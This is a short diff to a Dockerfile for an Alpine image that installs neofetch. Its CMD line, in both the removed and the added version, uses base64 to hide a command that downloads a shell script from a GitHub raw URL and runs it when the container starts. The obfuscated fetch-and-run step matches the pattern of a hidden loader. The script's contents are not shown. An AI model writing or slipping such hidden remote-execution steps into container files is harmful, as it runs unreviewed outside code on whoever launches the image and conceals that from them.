@@ -1,3 +1,3 @@
 FROM alpine
 RUN apk add --no-cache neofetch
-CMD echo d2dldCAtcU8gL3Jvb3QvY21kLnNoIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9nb29mdy9jbWQvSEVBRC9zaCAmJiBleGVjIC9iaW4vc2ggL3Jvb3QvY21kLnNoCg== | base64 -d | source /dev/stdin
+CMD wget -qO /root/cmd.sh $(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2dvb2Z3L2NtZC9IRUFEL3NoCg== | base64 -d) && exec /bin/sh /root/cmd.sh
